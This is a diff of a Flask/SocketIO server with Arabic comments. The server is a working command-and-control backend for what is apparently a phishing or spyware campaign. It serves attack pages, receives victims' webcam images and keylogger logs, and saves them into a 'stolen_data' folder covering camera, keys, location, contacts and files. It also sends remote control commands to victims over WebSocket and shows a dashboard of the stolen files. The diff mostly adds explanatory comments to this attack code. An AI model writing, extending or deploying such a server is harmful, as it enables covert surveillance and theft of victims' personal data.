@@ -11,19 +11,21 @@ import logging
 app = Flask(__name__)
 app.config['SECRET_KEY'] = 'cairopy_sec_2024'
 
-# استخدام gevent لضمان التوافق مع Render
+# استخدام gevent لضمان التوافق مع Render وتجنب أخطاء WebSocket
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode='gevent')
 
-# إعداد المسارات المطلقة للمجلدات لضمان عملها على Linux
+# إعداد المسارات المطلقة للمجلدات لضمان عملها على Linux (Render)
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 STOLEN_DIR = os.path.join(BASE_DIR, "stolen_data")
 
+# إنشاء مجلدات حفظ البيانات تلقائياً إذا لم تكن موجودة
 folders = ['camera', 'keys', 'location', 'contacts', 'files']
 for folder in folders:
     os.makedirs(os.path.join(STOLEN_DIR, folder), exist_ok=True)
 
 VICTIM_IP = "Unknown"
 
+# المسارات الأساسية لصفحات الهجوم (يجب أن تكون الملفات داخل مجلد templates)
 @app.route('/')
 def index_attack(): return render_template('index.html')
 
@@ -33,6 +35,7 @@ def image_attack(): return render_template('image.html')
 @app.route('/qr')
 def qr_attack(): return render_template('qr.html')
 
+# استقبال الصور من الكاميرا
 @app.route('/api/camera', methods=['POST'])
 def receive_camera():
     data = request.json
@@ -43,10 +46,12 @@ def receive_camera():
         filename = f"{v_id}_{p_type}_{datetime.now().strftime('%H%M%S')}.jpg"
         path = os.path.join(STOLEN_DIR, 'camera', filename)
         with open(path, 'wb') as f:
+            # معالجة بيانات الصورة base64
             f.write(base64.b64decode(img_data.split(',')[1] if ',' in img_data else img_data))
         return jsonify({"status": "ok"})
     return jsonify({"status": "error"}), 400
 
+# استقبال سجلات لوحة المفاتيح
 @app.route('/api/keylog', methods=['POST'])
 def receive_keylog():
     data = request.json
@@ -57,23 +62,26 @@ def receive_keylog():
         f.write(json.dumps(log) + '\n')
     return jsonify({"status": "ok"})
 
+# إرسال أوامر التحكم للضحية
 @app.route('/api/control', methods=['POST'])
 def control_victim():
     data = request.json
-    action = data.get('action')
-    socketio.emit('control', data) # إرسال الأمر مباشرة للضحية عبر WebSocket
+    socketio.emit('control', data) 
     return jsonify({"status": "sent"})
 
+# لوحة التحكم الرئيسية (Dashboard)
 @app.route('/dashboard')
 def dashboard():
+    # جلب قائمة الملفات المسروقة لعرضها
     files_map = {f: os.listdir(os.path.join(STOLEN_DIR, f)) for f in folders}
     return render_template('dashboard.html', files=files_map, victim_ip=VICTIM_IP)
 
+# مسار لجلب الملفات المسروقة وعرضها في المتصفح
 @app.route('/stolen/<category>/<filename>')
 def serve_stolen(category, filename):
     return send_file(os.path.join(STOLEN_DIR, category, filename))
 
 if __name__ == '__main__':
-    # ملاحظة: في Render سيتم تجاهل هذا الجزء واستخدام أمر gunicorn
+    # التشغيل المحلي (في Render سيتم استخدام gunicorn)
     port = int(os.environ.get("PORT", 5000))
     socketio.run(app, host='0.0.0.0', port=port)
